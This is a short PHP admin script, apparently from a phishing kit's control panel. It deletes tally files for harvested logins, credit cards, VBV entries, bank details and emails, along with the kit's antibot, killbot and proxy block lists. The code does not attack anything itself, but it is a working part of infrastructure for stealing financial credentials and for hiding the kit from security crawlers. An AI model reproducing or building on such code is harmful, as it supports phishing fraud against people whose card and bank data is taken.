<?php
error_reporting(0);
session_start();
if (!isset($_SESSION['admin'])) {
	header("location: index.php");
}
unlink("../result/clicker.txt");
unlink("../result/total_click.txt");
unlink("../result/log_visitor.txt");
unlink("../result/total_bin.txt");
unlink("../result/total_login.txt");
unlink("../result/total_cc.txt");
unlink("../result/total_vbv.txt");
unlink("../result/total_email.txt");
unlink("../result/total_bank.txt");
unlink("../result/total_bot.txt");
unlink("../block_bot.txt");
unlink("../proxy-block.txt");
unlink("../antibot-block.txt");
unlink("../killbot-block.txt");
echo "<script type='text/javascript'>window.top.location='index.php';</script>";
?>